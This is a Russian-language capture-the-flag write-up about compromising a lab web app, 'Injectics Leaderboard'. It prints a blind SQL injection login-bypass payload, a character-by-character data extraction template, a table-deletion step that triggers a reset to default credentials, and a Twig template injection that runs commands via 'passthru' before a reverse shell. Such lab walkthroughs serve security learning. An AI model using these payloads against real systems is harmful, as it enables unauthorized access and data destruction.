Сканируем открытые порты
```
Host is up (0.00049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b3:c2:16:27:98:f5:17:54:85:a7:8d:54:98:a5:f7:02 (RSA)
|   256 04:0b:bc:70:70:70:57:3c:59:13:e1:eb:ac:51:4d:89 (ECDSA)
|_  256 78:75:4a:af:dd:02:1e:a0:ce:36:0f:62:15:98:0c:7f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Injectics Leaderboard
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up)
```

Смотрим что на веб-сервере

![697](../images/Pasted%20image%2020260527160253.png)

Есть форма входа, которая подтягивает JS скрипт

![](../images/Pasted%20image%2020260527163938.png)

В этом JS скрипте обеспечивается примитивная защита от SQL инъекции
```
$("#login-form").on("submit", function(e) {  
    e.preventDefault();  
    var username = $("#email").val();  
    var password = $("#pwd").val();  
  
    const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];  
            for (let keyword of invalidKeywords) {  
                if (username.includes(keyword)) {  
                    alert('Invalid keywords detected');  
                   return false;  
                }  
            }  
    $.ajax({  
        url: 'functions.php',  
        type: 'POST',  
        data: {  
            username: username,  
            password: password,  
            function: "login"  
        },  
        dataType: 'json',  
        success: function(data) {  
            if (data.status == "success") {  
                if (data.auth_type == 0){  
                    window.location = 'dashboard.php';  
                }else{  
                    window.location = 'dashboard.php';  
                }  
            } else {  
                $("#messagess").html('<div class="alert alert-danger" role="alert">' + data.message + '</div>');  
            }  
        }  
    });  
});
```

Запустив SQLmap получаем результат
```
POST parameter 'username' appears to be 'MySQL >= 5.0.12 RLIKE time-based blind' injectable
```

Что-то полуить из БД через этот параметр не удалось

![](../images/Pasted%20image%2020260527164938.png)

Я посмотрел пейлоад, который обеспечивает обход аутентификации
```
12312' RLIKE SLEEP(5)-- WSqs
```

Посмотрев логику взаимодействия можно действительно увидеть, что система успешно аутентифицирует нас

![](../images/Pasted%20image%2020260527203009.png)

Зайдя на сайт видим  таблицу, которую мы можем редактировать

![](../images/Pasted%20image%2020260527165231.png)

Прогоняем через SQLmap и видим, что параметр gold и остальные - уязвимы к SQL инъекции

![](../images/Pasted%20image%2020260527180358.png)

Далее пробуем вытащить какую-то информацию из БД. Выбираем функцию database(), которая возвращает имя текущей БД и сравниваем каждый раз больше или меньше код символа, чем мы предполагаем.

![](../images/Pasted%20image%2020260527222058.png)

Таким образом можно понять, что на третьей позиции символ у которого код ASCII 99.

![](../images/Pasted%20image%2020260527222727.png)

Получаем название БД
```
bac_test
```

Таким же образом вытаскиваем версию БД.
```
MAKE_SET(ASCII(SUBSTRING(@@version,{POS},1))>{ASCII}, 999, 111)

56 46 48 46 52 49 45 48 117 98 117 110 116 117 48 46 50 48 46 48 52 46 49 

8.0.41-0ubuntu0.20.04.1
```

После нахождения версии БД я попробовал очень много разных подходов, но не смог больше вытянуть вообще ничего. Я вернулся к исходному коду и обнаружил там отсылку на файл mail.log

Пробуем перейти и видим, что там нам инструкция про то, что происходит с БД, если ее кто-то удалит или повредит. Там устанавливаются стандартные пароли!

![](../images/Pasted%20image%2020260528113340.png)

Пробуем удалить таблицу из БД и она реально удаляется. БД перезагружается.

![](../images/Pasted%20image%2020260528004752.png)

С кредами из mail.log получается зайти на сайт

![](../images/Pasted%20image%2020260528114223.png)

Кроме того я прокрутил в ffuf исходный сайт и нашел там composer.json, в нем мы можем увидеть отсылку на twig версии 2.14.0, значит где-то используются шаблоны

![](../images/Pasted%20image%2020260528114430.png)

Проверим шаблоны в профиле, введя {{7 * 7}}

![](../images/Pasted%20image%2020260528120736.png)

Зайдя на профиль видим, что оно выполнилось. Уязвимость подтверждена.

![](../images/Pasted%20image%2020260528120800.png)

Далее надо было определить какая функция работает. Из стандартных system, exec, exec_shell ничего не подошло.
```
{{['id', '']|sort('passthru')|join}} - вывело id пользователя
```

Далее подставляем туда реверс шелл и получаем входящее соединение.

![](../images/Pasted%20image%2020260528122825.png)

Переходим в директорию flags и читаем флаг

![](../images/Pasted%20image%2020260528122912.png)

